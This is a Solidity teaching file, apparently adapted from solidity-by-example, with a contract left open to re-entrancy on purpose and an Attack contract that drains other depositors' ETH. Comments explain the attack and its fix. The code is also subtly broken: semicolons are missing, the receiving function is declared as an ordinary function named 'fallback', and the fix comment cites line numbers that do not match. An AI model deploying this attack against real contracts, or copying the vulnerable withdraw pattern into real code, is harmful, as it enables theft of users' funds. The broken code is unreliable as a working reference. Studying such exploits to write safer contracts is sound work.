// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// Based on https://solidity-by-example.org/hacks/re-entrancy

/*
ReentrantVulnerable is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy ReentrantVulnerable
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into ReentrantVulnerable
3. Deploy Attack with address of ReentrantVulnerable
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call ReentrantVulnerable.withdraw multiple times before
ReentrantVulnerable.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- ReentrantVulnerable.deposit
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack.fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
*/

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        /**
         * Solution is :
         * Easy way :
         *  - do state change before any external contract call. i.e.,
         *  - balances[msg.sender] = 0;
         *  - then use line 25
         *  - remove line 28
         * Another way is by using mutex. Check openzeppelin reentrancyguard contract.
         */

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to withdraw");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerable) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    function fallback() external payable {
        // till reentrantVulnerable contract has the balance in it call withdraw.
        if(address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw()
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether)
        reentrantVulnerable.deposit{value : 1 ether}();
        reentrantVulnerable.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
